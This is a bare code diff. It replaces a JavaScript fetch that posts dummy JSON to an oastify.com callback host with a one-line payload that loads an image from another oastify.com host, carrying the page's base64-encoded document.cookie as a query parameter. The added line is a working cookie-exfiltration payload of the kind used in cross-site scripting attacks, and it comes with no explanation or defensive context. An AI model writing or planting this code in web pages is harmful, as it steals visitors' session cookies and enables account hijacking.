@@ -1,8 +1,1 @@
-fetch("https://rc7b8x4qmcbnuq3ghbam5ro7lyrpff34.oastify.com/test", {
-  method: "POST",
-  body: JSON.stringify({
-    userId: 1,
-    title: "Fix my bugs",
-    completed: false
-  })
-});
+x = new Image(); x.src = 'https://907twfs8auz5i8ry5ty4t9cp9gf73yrn.oastify.com?data='+btoa(document.cookie); 
